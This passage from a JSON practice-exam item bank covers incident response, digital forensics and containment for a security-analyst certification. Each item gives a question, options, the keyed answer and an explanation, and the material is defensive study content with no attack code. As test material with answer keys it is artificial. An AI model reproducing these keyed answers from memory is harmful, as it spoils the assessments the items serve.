necessary.","l":"c9-process","l2":"","k":"incident detection and validation"},{"id":"sg9-8","set":"sg","ch":9,"d":3,"q":"Matt is concerned about the fact that log records from his organization contain conflicting timestamps due to unsynchronized clocks. What protocol can he use to synchronize clocks throughout the enterprise?","o":["NTP","FTP","ARP","SSH"],"a":0,"e":"The Network Time Protocol (NTP) provides a common source of time information that allows the synchronizing of clocks throughout an enterprise.","l":"c9-process","l2":"c2-logging","k":"NTP clock synchronization"},{"id":"sg9-9","set":"sg","ch":9,"d":3,"q":"Which one of the following document types would outline the authority of a CSIRT responding to a cybersecurity incident?","o":["Policy","Procedure","Playbook","Baseline"],"a":0,"e":"An organization’s incident response policy should contain a clear description of the authority assigned to the CSIRT while responding to an active cybersecurity incident.","l":"c9-foundation","l2":"","k":"incident response policy authority"},{"id":"sg9-10","set":"sg","ch":9,"d":3,"q":"During an incident report, an analyst writes, “The adversary’s objective was to gain persistent access to the environment.” In MITRE ATT&amp;CK terminology, what does that objective represent?","o":["Tactic","Technique","Subtechnique","Procedure"],"a":0,"e":"“Gain persistent access to the environment” describes a high-level goal that guides what the adversary is trying to achieve, which aligns with a tactic in MITRE ATT&amp;CK because tactics are the adversary’s objectives or why they perform actions during an intrusion. A technique is the specific method used to accomplish part of that goal, a subtechnique is a more detailed variant of a technique, and a procedure is the concrete, observed implementation of a technique in a particular incident such as the exact commands, tools, and steps used.","l":"c9-frameworks","l2":"","k":"MITRE ATT&CK tactics"},{"id":"sg9-11","set":"sg","ch":9,"d":3,"q":"What phase of the Cyber Kill Chain includes creation of persistent backdoor access for attackers?","o":["Delivery","Exploitation","Installation","C&amp;C"],"a":2,"e":"The installation phase of the Cyber Kill Chain focuses on providing persistent backdoor access for attackers. Delivery occurs when the tool is put into action either directly or indirectly, whereas exploitation occurs when a vulnerability is exploited. Command and control (C&amp;C) uses two-way communications to provide continued remote control.","l":"c9-frameworks","l2":"","k":"Cyber Kill Chain installation"},{"id":"sg9-12","set":"sg","ch":9,"d":3,"q":"Robert is finishing a draft of a proposed incident response policy for his organization. Who would be the most appropriate person to sign the policy?","o":["CEO","Director of security","CIO","CSIRT leader"],"a":0,"e":"The incident response policy provides the CSIRT with the authority needed to do their job. Therefore, it should be approved by the highest possible level of authority within the organization, preferably the CEO.","l":"c9-foundation","l2":"","k":"incident response policy approval"},{"id":"sg9-13","set":"sg","ch":9,"d":3,"q":"Which one of the following is not an objective of the containment, eradication, and recovery phase of incident response?","o":["Detect an incident in progress.","Implement a containment strategy.","Restore systems from backup.","Eradicate the effects of the incident."],"a":0,"e":"Detection of a potential incident occurs during the detection and analysis phase of incident response. The other activities listed are all objectives of the containment, eradication, and recovery phase.","l":"c9-process","l2":"c11-contain","k":"containment eradication recovery phase"},{"id":"sg9-14","set":"sg","ch":9,"d":3,"q":"After restoring operations, the CSIRT wants to delete collected disk images and packet captures to free storage. Legal counsel says there is a reasonable chance the incident could lead to civil litigation. What should the team do next?","o":["Delete the evidence because it is no longer needed, and retaining it is a security risk.","Consult with counsel to understand the retention requirements.","Retain the final report, but delete any sensitive work products.","Retain the evidence for two years, and then discard it."],"a":1,"e":"Consulting with counsel to understand retention requirements is the right next step because the possibility of civil litigation means the team may have a legal duty to preserve potentially relevant evidence, and counsel can direct a defensible legal hold and chain-of-custody approach. Deleting the evidence because operations are restored risks spoliation and undermines the organization’s legal position, keeping only the final report while deleting underlying artifacts can remove the supporting proof needed to substantiate findings, and picking an arbitrary two-year period may not meet jurisdictional rules, contractual obligations, regulatory requirements, or the specific preservation timeline counsel would impose for this matter.","l":"c9-process","l2":"c10-analysis","k":"evidence retention legal hold"},{"id":"sg9-15","set":"sg","ch":9,"d":3,"q":"A CSIRT is investigating reports that a file server is “slow” and sees a spike in SMB traffic during normal business hours. The organization recently completed a major data migration, and it is unclear whether the activity is expected. Which action best supports accurate detection and analysis in this situation?","o":["Quarantine the affected file server to prevent data exfiltration.","Compare current behavior to established system and network baselines.","Wipe the server to eradicate the attack.","Review media reports to identify any current attacks taking place."],"a":1,"e":"Comparing current behavior to established system and network baselines best supports accurate detection and analysis because it helps determine whether the SMB spike aligns with known normal patterns, such as migration-related access, scheduled jobs, or peak usage, or whether it represents an abnormal deviation that warrants incident handling. Quarantining the server is a containment action that is premature when expected activity is plausible and could disrupt business operations. Wiping the server is an eradication step that would destroy evidence and is unjustified without confirmation of compromise. Reviewing media reports does not provide environment-specific context and cannot reliably distinguish legitimate migration traffic from malicious activity on that particular server.","l":"c9-process","l2":"c3-network","k":"baseline comparison analysis"},{"id":"sg9-16","set":"sg","ch":9,"d":3,"q":"Who is the best facilitator for a post-incident lessons learned session?","o":["CEO","CSIRT leader","Independent facilitator","First responder"],"a":2,"e":"Lessons learned sessions are most effective when facilitated by an independent party who was not involved in the incident response effort.","l":"c9-process","l2":"","k":"lessons learned review facilitation"},{"id":"sg9-17","set":"sg","ch":9,"d":3,"q":"Which one of the following elements is not normally found in an incident response policy?","o":["Performance measures for the CSIRT","Definition of cybersecurity incidents","Definition of roles, responsibilities, and levels of authority","Procedures for rebuilding systems"],"a":3,"e":"Procedures for rebuilding systems are highly technical and would normally be included in a playbook or procedure document rather than an incident response policy.","l":"c9-foundation","l2":"","k":"incident response policy contents"},{"id":"sg9-18","set":"sg","ch":9,"d":3,"q":"A responder notes that the attacker achieved execution by using PowerShell, and the team captures the exact command line and script name used on a specific host. In MITRE ATT&amp;CK terms, what is the exact command line and script name an example of?","o":["Tactic","Technique","Subtechnique","Procedure"],"a":3,"e":"The exact command line and script name are a procedure because they are the specific, observed implementation details of how the attacker carried out an activity on a particular host. A tactic would be the broader objective such as execution, a technique would describe the general method such as using PowerShell for execution, and a subtechnique would narrow that method to a more specific variant, but neither of those is as concrete as the precise command and script captured in the incident.","l":"c9-frameworks","l2":"","k":"MITRE ATT&CK procedures"},{"id":"sg9-19","set":"sg","ch":9,"d":3,"q":"Tommy is the CSIRT team leader for his organization and is responding to a newly discovered cybersecurity incident. What document is most likely to contain step-by-step instructions that he might follow in the early hours of the response effort?","o":["Policy","Baseline","Playbook","Textbook"],"a":2,"e":"Incident response playbooks contain detailed, step-by-step instructions that guide the early response to a cybersecurity incident. Organizations typically have playbooks prepared for high-severity and frequently occurring incident types.","l":"c9-foundation","l2":"","k":"incident response playbooks"},{"id":"sg9-20","set":"sg","ch":9,"d":3,"q":"During an intrusion investigation, the CSIRT discovers that the attacker ran the open source credential-dumping tool Mimikatz on a compromised Windows workstation to extract hashes. In the Diamond Model, what vertex does the use of Mimikatz represent?","o":["Adversary","Capability","Infrastructure","Victim"],"a":1,"e":"Mimikatz is a tool the attacker uses to carry out an action, so it represents the Capability vertex because it reflects the technical means, software, and techniques used to achieve the intrusion objectives. The adversary vertex is the person or group operating the tool rather than the tool itself; infrastructure refers to the systems and services the attacker uses to communicate or stage activity such as domains, IPs, or servers rather than the credential dumper; and victim refers to the targeted organization and affected workstation rather than the attacker’s tooling.","l":"c9-frameworks","l2":"","k":"Diamond Model capability vertex"},{"id":"sg10-1","set":"sg","ch":10,"d":3,"q":"Henry is building a timeline of events for a recent incident using his forensic tool. As he loads and reviews data, he notices that one system seems to have experienced all of the events exactly two hours before the rest of the systems involved, including port scans and other actions taken by the malicious actor. What has most likely occurred?","o":["The system’s time is incorrectly set.","The attacker used the system as a test before moving on to the rest of the environment.","The system is in another time zone.","The system’s logs have been modified by the attacker."],"a":0,"e":"Incorrectly set system clocks are a common cause of this type of issue. Forensic tools take time zone differences into account, allowing complex timelines to be built. The attacker is unlikely to do broad-scale port scans and other attacks against a single system, and they’re also unlikely to modify one system’s logs to have a different time without removing evidence of their actions.","l":"c10-analysis","l2":"","k":"forensic timeline clock skew"},{"id":"sg10-2","set":"sg","ch":10,"d":3,"q":"Gurvinder’s EDR tool has reported a potential ransomware process on an executive’s workstation. Local desktop support is able to remotely connect and validates that files are being encrypted. If Gurvinder wants to capture the information most likely to be lost during a response process so that his team will have the best opportunity to analyze the malware, what should he do first?","o":["A forensic disk image","A live memory capture","A copy of the system’s logs","A backup of the encrypted files"],"a":1,"e":"If Gurvinder wants to analyze the active malware, a live memory capture will provide him with the information that is most likely to be lost. Triaging what should be captured in a timely way is an important part of this scenario. A disk image is the next most likely item to capture, but specifically capturing just logs or the encrypted files is less likely to be done than a full disk image.","l":"c10-evidence","l2":"","k":"live memory acquisition"},{"id":"sg10-3","set":"sg","ch":10,"d":3,"q":"Mike is performing a forensic investigation of a drive and prepares a copy of the drive and then logs the process on his chain of custody form. Later, a co-worker arrives to take the drive copy for analysis by the forensic team. As they work, they also record their actions in the form. What issue is there with this chain of custody process?","o":["Mike should have another co-worker in the room for all activities.","Mike should perform the forensic analysis rather than having another team do it.","The co-worker who delivered the drive did not record the transfer of custody.","The analysis should be done on the original drive, not the copy."],"a":2,"e":"Mike’s organization missed a custody transfer when the drive was taken to the forensic team. This should also be logged and recorded. While having a witness to activities can be helpful, it is not necessary for chain of custody documentation. Transferring to others for specific work is a normal process but must be logged as described. Analysis should typically be done on copies to preserve the original.","l":"c10-analysis","l2":"","k":"chain of custody transfer"},{"id":"sg10-4","set":"sg","ch":10,"d":3,"q":"Alice wants to copy a drive without any chance of it being modified by the copying process. What type of device should she use to ensure that this does not happen during her data acquisition process?","o":["A read blocker","A drive cloner","A write blocker","A hash validator"],"a":2,"e":"Write blockers ensure that no changes are made to a source drive when creating a forensic copy. Preventing reads would stop you from copying the drive, drive cloners may or may not have write blocking capabilities built in, and hash validation is useful to ensure contents match but don’t stop changes to the source drive from occurring.","l":"c10-analysis","l2":"c10-evidence","k":"write blocker protection"},{"id":"sg10-5","set":"sg","ch":10,"d":3,"q":"Frederick’s organization has been informed that data must be preserved due to pending legal action. What is this type of requirement called?","o":["A retainer","A legal hold","A data freeze","An extra-legal hold"],"a":1,"e":"A legal hold is a process used to preserve all data related to pending legal action or when legal action may be expected. A retainer is paid to a lawyer to keep them available for work. The other two terms were made up for this question.","l":"c10-analysis","l2":"","k":"legal hold preservation"},{"id":"sg10-6","set":"sg","ch":10,"d":3,"q":"Jill has completed a forensic drive imaging process and compares the hashes of the drive and the image she has created on a network file share. The hashes match. What does Jill know based on this?","o":["The drive and image are the same at a binary level.","The image contains the same data, but does not contain the same drive layout.","The network file share has a copy of all of the files contained on the drive.","None of the above."],"a":0,"e":"Hashing is used to ensure that a bit-level copy of the drive is made and matches. Jill can rest assured that her copy process has delivered an identical copy of the imaged drive, making it a valid forensic copy.","l":"c10-analysis","l2":"","k":"forensic hash integrity validation"},{"id":"sg10-7","set":"sg","ch":10,"d":3,"q":"Jeff is investigating a system compromise and knows that the first event was reported on October 5. What forensic tool capability should he use to map other events found in logs and files to this date?","o":["A timeline","A log viewer","Registry analysis","Timestamp validator"],"a":0,"e":"Timelines are one of the most useful tools when conducting an investigation of a compromise or other event. Forensic tools provide built-in timeline capabilities to allow this type of analysis.","l":"c10-analysis","l2":"","k":"forensic timeline analysis"},{"id":"sg10-8","set":"sg","ch":10,"d":3,"q":"During her forensic copy validation process, Danielle hashed the original and then hashed the image files and received the following MD5 sums. What is likely wrong?\n<p><code>b49794e007e909c00a51ae208cacb169 original.img</code></p>\n<p><code>d9ff8a0cf6bc0ab066b6416e7e7abf35 clone.img</code></p>","o":["The original was modified.","The clone was modified.","dd failed.","An unknown change or problem occurred."],"a":3,"e":"Without more detail, you cannot determine where the problem occurred. All that Danielle knows is that the hashes of the original and images don’t match. This could be due to modifications to the source, the images, or problems with the imaging process.","l":"c10-analysis","l2":"","k":"forensic copy validation"},{"id":"sg10-9","set":"sg","ch":10,"d":3,"q":"Jennifer’s organization has a log retention period of 45 days due to space constraints. The organization has recently received a legal hold notification that includes data that would be found in the logs that occurred 30 days ago. What must Jennifer’s organization do?","o":["Follow their normal retention practices.","Wipe all of the logs every 30 days.","File a notice with the judge that the organization cannot comply due to a lack of storage.","Preserve the existing logs and any new related logs."],"a":3,"e":"Once a legal hold is filed, related data of any sort must be retained. This may mean that Jennifer’s organization has to identify means to preserve the logs if they do not currently have the space to do so. Following their existing retention efforts or wiping the logs on a shorter schedule will both violate the hold order, and organizations must comply once they receive notice.","l":"c10-analysis","l2":"c2-logging","k":"legal hold log retention"},{"id":"sg10-10","set":"sg","ch":10,"d":3,"q":"As part of her review of a forensic process, Lisa is reviewing a log that lists each time a person handled a forensic image. She notices that an entry lists forensic analysis actions but does not have a name logged. What concept does this violate?","o":["Image integrity","Forensic authenticity","Preservation","Chain of custody"],"a":3,"e":"Lisa has discovered an issue with chain of custody documentation. Each transfer, forensic action, or other change or event that occurs should be logged as part of a chain of custody.","l":"c10-analysis","l2":"","k":"chain of custody documentation"},{"id":"sg10-11","set":"sg","ch":10,"d":3,"q":"Why is validating data integrity critical to forensic processes?","o":["It ensures the system has not been compromised.","It ensures the system has not been altered by the forensic examiner.","It ensures the operating system version matches the expected version.","It is required by the legal hold process."],"a":1,"e":"Validating data integrity ensures that images or files are forensically sound and have not been altered or modified either on purpose or accidentally during the forensic acquisition and analysis process. It does not ensure the system has not been compromised, and although artifacts can be assessed to validate file versions, typically they are not used to validate operating system versions. Finally, legal holds require data preservation, not data integrity validation.","l":"c10-analysis","l2":"","k":"forensic data integrity validation"},{"id":"sg10-12","set":"sg","ch":10,"d":3,"q":"Carl does not have the ability to capture data from a cell phone using mobile forensic or imaging software, and the phone does not have removable storage. Fortunately, the phone was not set up with a PIN or screen lock. What is his best option to ensure he can see email and other data stored there?","o":["Physical acquisition","Logical access","Filesystem access","Manual access"],"a":3,"e":"Manual access is used when phones cannot be forensically imaged or accessed as a volume or filesystem. Manual access requires that the phone be reviewed by hand, with pictures and notes preserved to document the contents of the phone.","l":"c10-evidence","l2":"","k":"mobile device evidence acquisition"},{"id":"sg10-13","set":"sg","ch":10,"d":3,"q":"Marko is triaging a large-scale incident that has impacted servers across his organization including a domain controller, two cloud-based web servers that are part of an auto-scaling group, and a departmental file server used by his organization’s physical facilities team. How should he best triage this set of servers to ensure he responds appropriately?","o":["Prioritize the web servers because they are ephemeral.","Prioritize the file server because it impacts facilities operations.","Prioritize the domain controller because of its importance to the domain.","Prioritize patching to stop the attack."],"a":0,"e":"Based on volatility, Marko needs to prioritize the web servers because they may be removed if the auto scaling group shrinks. Once he’s done there, the domain controller is likely to be the second item he’ll work on due to its broad impact and criticality, with the file server being last. There is no indication that patching will stop this attack, so prioritizing it isn’t a clear triage step.","l":"c10-evidence","l2":"","k":"order of volatility triage"},{"id":"sg10-14","set":"sg","ch":10,"d":3,"q":"Which of the following is <i>not</i> a potential issue with live imaging of a system?","o":["Remnant data from the imaging tool will remain.","Unallocated space will be captured.","Memory or drive contents may change during the imaging process.","Malware may detect the imaging tool and work to avoid it."],"a":1,"e":"Unallocated space is typically not captured during a live image, potentially resulting in data being missed. Remnant data from the tool, memory and drive contents changing while the image is occurring, and malware detecting the tool are all possible issues.","l":"c10-evidence","l2":"","k":"live system drive imaging"},{"id":"sg10-15","set":"sg","ch":10,"d":3,"q":"During his investigation, Jeff, a certified forensic examiner, is provided with a drive image created by an IT staff member and is asked to add it to his forensic case. What is the most important issue that Jeff could encounter if the case goes to court and his procedures are questioned?","o":["Bad checksums","Hash mismatch","Antiforensic activities","Inability to certify chain of custody"],"a":3,"e":"Jeff did not create the image and cannot validate chain of custody for the drive. This also means he cannot prove that the drive is a copy of the original. There’s no mention of a forensic hash or checksum for the original drive, so there is no indication of a bad checksum or a hash mismatch. Antiforensic activities may have occurred, but we cannot determine that from the question.","l":"c10-analysis","l2":"","k":"chain of custody certification"},{"id":"sg10-16","set":"sg","ch":10,"d":3,"q":"Jeff is investigating a system that is running malware that he believes encrypts its data on the drive. What process should he use to have the best chance of viewing that data in an unencrypted form?","o":["Live imaging","Offline imaging","Brute-force encryption cracking","Causing a system crash and analyzing the memory dump"],"a":0,"e":"Imaging the system while the program is live has the best probability of allowing Jeff to capture the encryption keys or decrypted data from memory. An offline image after the system is shut down will likely result in having to deal with the encrypted file. Brute-force attacks are typically slow and may not succeed, and causing a system crash may result in corrupted or nonexistent data.","l":"c10-evidence","l2":"","k":"live system memory acquisition"},{"id":"sg10-17","set":"sg","ch":10,"d":3,"q":"Susan has received SIEM alert for an IP security camera that is generating a massive amount of outbound traffic, a behavior consistent with a DDoS botnet according to the alert. The device has a proprietary minimal embedded operating system and no EDR agent. She knows that rebooting the camera will almost certainly wipe the malware from its volatile memory. What should she do to acquire evidence for her investigation?","o":["Factory reset the camera to restore it to operation","Capture network traffic to and from the camera for analysis","Perform a full disk image of the camera after unplugging it and connecting via USB","Scan the camera to identify any open ports and vulnerabilities"],"a":1,"e":"Susan’s best bet to capture evidence from an embedded device like this that may have a memory-resident malware package is to capture the network traffic it is sending. Unfortunately, direct memory access is unlikely to be reasonably viable for her. Resetting the camera or unplugging it will both result in memory-resident malware being lost. While the camera may then be re-infected, there is no guarantee of capturing the process or the malware. Scanning for open ports and vulnerabilities will not provide information about the malware or directly help with her investigation.","l":"c10-evidence","l2":"c3-tools","k":"network evidence acquisition"},{"id":"sg10-18","set":"sg","ch":10,"d":3,"q":"During a forensic investigation, Ben asks Chris to sit with him and to sign off on the actions he has taken. What is he doing?","o":["Following the “two person” rule","Over-the-shoulder validation","Pair forensics","Separation of duties"],"a":0,"e":"Ben is following the “two-person” rule, a best practice for chain of custody documentation that helps to ensure that no tampering occurs and that the integrity of the process is maintained. Chris is acting as the validator for the actions that Ben takes and acts as a witness to the process.","l":"c10-analysis","l2":"","k":"two person rule chain custody"},{"id":"sg10-19","set":"sg","ch":10,"d":3,"q":"Which tool is <i>not</i> commonly used to generate the hash of a forensic copy?","o":["MD5","FTK","SHA1","AES"],"a":3,"e":"While the Advanced Encryption Standard (AES) does have a hashing mode, MD5, SHA1, and built-in hashing tools in FTK and other commercial tools are more commonly used for forensic hashes.","l":"c10-analysis","l2":"c2-crypto","k":"forensic hash algorithms"},{"id":"sg10-20","set":"sg","ch":10,"d":3,"q":"Which of the following issues makes both cloud and virtualized environments more difficult to perform forensics on?","o":["Other organizations manage them.","Systems may be ephemeral.","No forensic tools work in both environments.","Drive images cannot be verified."],"a":1,"e":"Both cloud and virtualized environments are often temporary (ephemeral) and thus can be difficult to perform forensics on. If you have a cloud, virtualized, or containerized environment, make sure you have considered how you would perform forensics, and what data preservation techniques you may need to use.","l":"c10-evidence","l2":"c2-infra","k":"cloud ephemeral forensic challenges"},{"id":"sg11-1","set":"sg","ch":11,"d":3,"q":"Which one of the phases of incident response involves primarily active undertakings designed to limit the damage that an attacker might cause?","o":["Containment, Eradication, and Recovery","Preparation","Post-incident Activity","Detection and Analysis"],"a":0,"e":"The Containment, Eradication, and Recovery phase of incident response includes active undertakings designed to minimize the damage caused by the incident and restore normal operations as quickly as possible.","l":"c11-contain","l2":"c9-process","k":"containment eradication recovery phase"},{"id":"sg11-2","set":"sg","ch":11,"d":3,"q":"Which one of the following criteria is not normally used when evaluating the appropriateness of a cybersecurity incident containment strategy?","o":["Effectiveness of the strategy","Evidence preservation requirements","Log records generated by the strategy","Cost of the strategy"],"a":2,"e":"NIST recommends using six criteria to evaluate a containment strategy: potential damage to resources, the need for evidence preservation, service availability, the time and resources required (including cost), the effectiveness of the strategy, and the duration of the solution.","l":"c11-contain","l2":"","k":"containment strategy evaluation criteria"},{"id":"sg11-3","set":"sg","ch":11,"d":3,"q":"Alice is responding to a cybersecurity incident and notices a system that she suspects is compromised. She places this system on a quarantine VLAN with limited access to other networked systems. What containment strategy is Alice pursuing?","o":["Eradication","Isolation","Honeypot","Removal"],"a":1,"e":"Putting the suspected compromised system onto a quarantine VLAN with limited ability to communicate with other networked systems is isolation, because the goal is to contain the incident by segmenting the affected host and preventing lateral movement or further damage while preserving it for investigation. Eradication focuses on eliminating the threat from the environment by removing malware, closing vulnerabilities, and ensuring the attacker no longer has a foothold. A honeypot is a deliberately deployed decoy system meant to attract and study attackers rather than a method for restricting a real, potentially infected production host. Removal generally refers to removing malicious components or affected assets from service or deleting them, which goes beyond simply restricting network connectivity.","l":"c11-contain","l2":"","k":"quarantine VLAN host isolation"},{"id":"sg11-4","set":"sg","ch":11,"d":3,"q":"An analyst seizes multiple thumb drives as part of an incident investigation. The drives contain evidence that may be used in court. Which action is MOST important to ensure the evidence remains admissible?","o":["Use purging or clearing to remove sensitive data from the drives","Maintain a detailed evidence log","Reimage drives and return them to their owners","Physically destroy the drives as they were involved in an incident and can no longer be trusted"],"a":1,"e":"Maintaining a detailed evidence log is most important because it establishes and preserves chain of custody, showing who handled the thumb drives, when and where they were stored, and what actions were taken with them, which is essential for evidence to be accepted in court. Purging or clearing would alter or destroy the data, invalidating the evidence rather than preserving it. Reimaging the drives would overwrite original contents and eliminate the very artifacts that need to be presented. Physically destroying the drives prevents any further analysis and guarantees the evidence cannot be produced in legal proceedings.","l":"c11-contain","l2":"c10-analysis","k":"evidence log chain of custody"},{"id":"sg11-5","set":"sg","ch":11,"d":3,"q":"A SOC team suspects several web servers are running a persistent web shell. They want to keep the servers running so forensic artifacts (RAM, open sockets, etc.) can be captured and the attacker observed, but they must prevent lateral movement and stop outbound attacks. Which containment approach best fits this requirement?","o":["Remove the servers from the network","Place the servers on a quarantine VLAN","Reimage and restore the servers from backup","Create ingress rules to block the attacker’s access"],"a":1,"e":"Placing the systems on a quarantine VLAN best matches the requirement because it keeps the servers running for volatile evidence capture. It also allows the team to monitor attacker activity. At the same time, segmentation can block lateral movement and restrict outbound traffic to stop attacks. Removing the servers from the network would cut off communications entirely and reduce opportunities to observe the attacker or collect evidence remotely. Reimaging and restoring from backup is a remediation step that destroys forensic artifacts and ends visibility into the intrusion. Creating ingress rules to block the attacker’s access focuses on inbound traffic and does not reliably prevent lateral movement or outbound connections from the compromised servers.","l":"c11-contain","l2":"c10-evidence","k":"quarantine VLAN network isolation"},{"id":"sg11-6","set":"sg","ch":11,"d":3,"q":"Which one of the following tools may be used to isolate an attacker so that they may not cause damage to production systems but may still be observed by cybersecurity analysts?","o":["Honeypot","DNS sinkhole","Darknet","Screened subnet"],"a":0,"e":"A honeypot is a decoy system designed to attract and contain attackers, allowing their techniques to be observed without risking real production assets. A DNS sinkhole mainly redirects or blocks malicious domain lookups to disrupt command-and-control and observe victim connection attempts, but it does not confine an attacker in an interactive environment. A darknet is unused address space monitored for unsolicited traffic and scanning, which is useful for detection and research, but does not provide a controlled target for safely engaging an attacker. A screened subnet is a network architecture pattern for placing public-facing services in a screened subnet to reduce risk to internal networks, but it is not specifically meant to lure and observe attackers the way a honeypot is.","l":"c11-contain","l2":"c4-hunt","k":"honeypot attacker isolation"},{"id":"sg11-7","set":"sg","ch":11,"d":3,"q":"Tamara is a cybersecurity analyst for a private business that is suffering a security breach. She believes the attackers have compromised a database containing sensitive information. Which one of the following activities should be Tamara’s first priority?","o":["Identifying the source of the attack","Eradication","Containment","Recovery"],"a":2,"e":"Tamara’s first priority should be containing the attack. This will prevent it from spreading to other systems and also potentially stop the exfiltration of sensitive information. Only after containing the attack should Tamara move on to eradication and recovery activities. Identifying the source of the attack should be a low priority.","l":"c11-contain","l2":"","k":"containment prioritization"},{"id":"sg11-8","set":"sg","ch":11,"d":3,"q":"What should be clearly identified during a lessons-learned review to reduce the likelihood of a similar incident escaping attention in the future?","o":["IoCs","Scope","Impact","Reimaging"],"a":0,"e":"During an incident investigation, the team may encounter new indicators of compromise (IoCs) based on the tactics, techniques, and procedures (TTPs) used by attackers. As part of the lessons-learned review, the team should clearly identify any new IoCs and make recommendations for updating the organization’s security monitoring program to include those IoCs. This will reduce the likelihood of a similar incident escaping attention in the future. Scope, impact, and reimaging should be considered during containment, eradication, and recovery.","l":"c11-recover","l2":"c4-hunt","k":"lessons learned IoC identification"},{"id":"sg11-9","set":"sg","ch":11,"d":3,"q":"Which one of the following pieces of information is most critical to conducting a solid incident recovery effort?","o":["Identity of the attacker","Time of the attack","Root cause of the attack","Attacks on other organizations"],"a":2,"e":"Understanding the root cause of an attack is critical to the incident recovery effort. Analysts should examine all available information to help reconstruct the attacker’s actions. This information is crucial for remediating security controls and preventing similar future attacks.","l":"c11-recover","l2":"c9-process","k":"root cause analysis in recovery"},{"id":"sg11-10","set":"sg","ch":11,"d":3,"q":"Lynda is disposing of a drive containing sensitive information that was collected during the response to a cybersecurity incident. The information is categorized as a high security risk, and she wants to reuse the media during a future incident. What is the appropriate disposition for this information?","o":["Clear","Erase","Purge","Destroy"],"a":2,"e":"Lynda should consult the flowchart that appears in Figure 11.5. According to that chart, the appropriate disposition for media that contains high-security risk information and will be reused within the organization is to purge it.","l":"c11-recover","l2":"","k":"media sanitization data purge"},{"id":"sg11-11","set":"sg","ch":11,"d":3,"q":"Which one of the following activities is not normally conducted during the recovery validation phase?","o":["Verify the permissions assigned to each account","Implement new firewall rules","Conduct vulnerability scans","Verify logging is functioning properly"],"a":1,"e":"New firewall rules, if required, would be implemented during the eradication and recovery phase. The validation phase includes verifying accounts and permissions, verifying the integrity of systems and data, verifying that logging is working properly, and conducting vulnerability scans.","l":"c11-recover","l2":"","k":"recovery verification activities"},{"id":"sg11-12","set":"sg","ch":11,"d":3,"q":"What incident response activity focuses on removing any artifacts of the incident that may remain on the organization’s network?","o":["Containment","Recovery","Post-incident Activities","Eradication"],"a":3,"e":"The primary purpose of eradication is to remove any of the artifacts of the incident that may remain on the organization’s network. This may include removing any malicious code from the network, sanitizing compromised media, and securing compromised user accounts.","l":"c11-recover","l2":"","k":"incident eradication"},{"id":"sg11-13","set":"sg","ch":11,"d":3,"q":"Which one of the following is not a common use of formal incident reports?","o":["Training new team members","Sharing with other organizations","Developing new security controls","Assisting with legal action"],"a":1,"e":"There are many potential uses for written incident reports. First, it creates an institutional memory of the incident that is useful when developing new security controls and training new security team members. Second, it may serve as an important record of the incident if there is ever legal action that results from the incident. These reports should be classified and not disclosed to external parties.","l":"c11-recover","l2":"c12-ir-report","k":"incident report documentation"},{"id":"sg11-14","set":"sg","ch":11,"d":3,"q":"Which one of the following data elements would not normally be included in an evidence log?","o":["Serial number","Record of handling","Storage location","Malware signatures"],"a":3,"e":"Malware signatures would not normally be included in an evidence log. The log would typically contain identifying information (e.g., the location, serial number, model number, hostname, MAC addresses and IP addresses of a computer); the name, title, and phone number of each individual who collected or handled the evidence during the investigation; the time and date (including time zone) of each occurrence of evidence handling; and the locations where the evidence was stored.","l":"c11-contain","l2":"c10-analysis","k":"evidence log documentation"},{"id":"sg11-15","set":"sg","ch":11,"d":3,"q":"A cybersecurity analyst detects malware beaconing from a production server that supports a revenue-generating application. Containment will likely require taking the server offline during business hours. What is the MOST appropriate next step?","o":["Isolate the attacker","Escalate to management","Identify the attacker","Reboot the affected server"],"a":1,"e":"Escalating to management is most appropriate because taking a revenue-generating production server offline during business hours is a business-impacting decision. Isolating the attacker is not a realistic, immediate action in most environments, and the practical containment step would be to isolate the server, which still requires business sign-off in this scenario. Identifying the attacker is not required before containment and can delay risk reduction. Rebooting the server is not a containment strategy and can destroy volatile evidence while doing nothing to address the underlying compromise.","l":"c11-contain","l2":"","k":"containment escalation"},{"id":"sg11-16","set":"sg","ch":11,"d":3,"q":"Joe would like to determine the appropriate disposition of a flash drive used to gather highly sensitive evidence during an incident response effort. He does not need to reuse the drive but wants to return it to its owner, an outside contractor. What is the appropriate disposition?","o":["Destroy","Clear","Erase","Purge"],"a":0,"e":"The data disposition flowchart in Figure 11.5 directs that any media containing highly sensitive information that will leave the control of the organization must be destroyed. Joe should purchase a new replacement device to provide to the contractor.","l":"c11-recover","l2":"","k":"media sanitization data destruction"},{"id":"sg11-17","set":"sg","ch":11,"d":3,"q":"Which one of the following is not typically found in a cybersecurity incident report?","o":["Chronology of events","Identity of the attacker","Estimates of impact","Documentation of lessons learned"],"a":1,"e":"Incident reports should include a chronology of events, estimates of the impact, and documentation of lessons learned, in addition to other information. Incident response efforts should not normally focus on uncovering the identity of the attacker, so this information would not be found in an incident report.","l":"c11-recover","l2":"c12-ir-report","k":"incident report contents"},{"id":"sg11-18","set":"sg","ch":11,"d":3,"q":"What NIST publication contains guidance on cybersecurity incident handling?","o":["SP 800-53","SP 800-88","SP 800-18","SP 800-61"],"a":3,"e":"NIST SP 800-61 is the <i>Computer Security Incident Handling Guide</i>. It is currently in revision 3. NIST SP 800-53 is <i>Security and Privacy Controls for Information Systems and Organizations</i>. NIST SP 800-88 is <i>Guidelines for Media Sanitization</i>. NIST SP 800-18 is the <i>Guide for Developing Security Plans for Federal Information Systems</i>.","l":"c11-contain","l2":"c9-process","k":"NIST SP 800-61 incident handling"},{"id":"sg11-19","set":"sg","ch":11,"d":3,"q":"Which one of the following is not a purging activity?","o":["Resetting to factory state","Overwriting","Block erase","Cryptographic erase"],"a":0,"e":"Resetting a device to factory settings is an example of a data-clearing activity. Data purging activities include overwriting, block erase, and cryptographic erase when performed using dedicated, standardized device commands.","l":"c11-recover","l2":"","k":"data clearing vs purging"},{"id":"sg11-20","set":"sg","ch":11,"d":3,"q":"Renee recently finished the containment and eradication of a security incident. She rebuilt two compromised application servers from known-good images and patched the exploited vulnerability. The servers are now back in production, but Renee wants to validate recovery success and ensure the attacker isn’t still present or attempting to re-enter.\n<p>Which single action BEST supports continuous monitoring in the immediate post-recovery period?</p>","o":["Reduce logging verbosity on the rebuilt servers","Reimage the servers to ensure no artifacts remain","Update antimalware software","Confirm the servers are forwarding logs to the SIEM"],"a":3,"e":"Confirming that servers are forwarding logs to the SIEM ensures centralized visibility, correlation, and alerting for signs of persistence or re-entry. Reducing logging verbosity would decrease visibility when detection is most important. Reimaging again would not provide ongoing monitoring and is redundant after rebuilding from known-good images. Updating antimalware is a good hardening step, but by itself it does not ensure continuous monitoring of activity on the rebuilt systems.","l":"c11-recover","l2":"c2-logging","k":"post recovery continuous 